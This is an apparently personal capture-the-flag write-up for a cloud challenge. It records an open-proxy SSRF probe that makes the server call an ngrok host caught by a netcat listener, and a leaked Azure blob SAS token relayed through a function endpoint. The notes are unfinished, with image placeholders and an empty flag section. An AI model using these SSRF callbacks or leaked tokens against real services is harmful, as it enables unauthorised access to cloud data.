# Challenge Name

### Description

Jaga reached Meow Olympurr and met some native Meows. While cautious at first, they warmed up and shared that they have recently created a website to promote tourism!  
However, the young Meows explained that they are not cy-purr security trained and would like to understand what they might have misconfigured in their environments. The young Meows were trying to get two different environments to work together, but it seems like something is breaking....  
Log a cy-purr security case by invoking the _mysterious_ function and retrieve the secret code!  
[d2p9lw76n0gfo0.cloudfront.net](http://d2p9lw76n0gfo0.cloudfront.net/)

## Solution

Endpoints



http://18.141.147.115:8080/
https://meowolympurr.z23.web.core.windows.net/
https://olympurr-app.azurewebsites.net/api/meowvellous

https://meowolympurr.blob.core.windows.net/

### Endpoint 1 - Cloud flare

GO to a 404 page, theres's an image link

http://18.141.147.115:8080/https://meowolympurr.z23.web.core.windows.net/images/ohno.jpg

### Endpoint 3 - Proxy

![[Pasted image 20221204010733.png]]


http://18.141.147.115:8080/https://030f-128-106-225-50.ngrok.io

```http
(base) [hacker@hackerbook ~]$ nc -nlvp 4444
Connection from 127.0.0.1:57562
GET / HTTP/1.1
Host: 030f-128-106-225-50.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 128.106.225.50
X-Forwarded-For: 18.141.147.115
X-Forwarded-Port: 8080
X-Forwarded-Proto: http
X-Forwarded-Proto: https

^CExiting.
(base) [hacker@hackerbook ~]$ 
```


### Endpoint 2 - Azure?

Check 404 page again

![[Pasted image 20221204010854.png]]

```html
<!--
For access to website source codes:
https://meowolympurr.blob.core.windows.net?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D
-->
</main>
```

Main Page has azure function  linke
![[Pasted image 20221204012908.png]]

### Azure Function

![[Pasted image 20221204012924.png]]

![[Pasted image 20221204013057.png]]

```
(base) [hacker@hackerbook tmp]$ nc -nlvp 4444
Connection from 127.0.0.1:57568
GET / HTTP/1.1
Host: 030f-128-106-225-50.ngrok.io
User-Agent: python-requests/2.28.1
Accept: */*
Accept-Encoding: gzip, deflate
X-Forwarded-For: 20.247.147.55
X-Forwarded-Proto: http

```


https://olympurr-app.azurewebsites.net/api/meowvellous?url=https%3A%2F%2Fmeowolympurr%2Eblob%2Ecore%2Ewindows%2Enet%3Fsv%3D2017%2D07%2D29%26ss%3Db%26srt%3Dsco%26sp%3Drl%26se%3D2022%2D12%2D12T00%3A00%3A00Z%26st%3D2022%2D09%2D01T00%3A00%3A00Z%26spr%3Dhttps%26sig%3DUE2%252FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%253D%0A

![[Pasted image 20221204013329.png]]


### Azure Blob

Related Link

1. https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blobs-introduction

https://meowolympurr.blob.core.windows.net/?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D

![[Pasted image 20221204015227.png]]



## Cloud Function Trying to access Source code


## Flag
``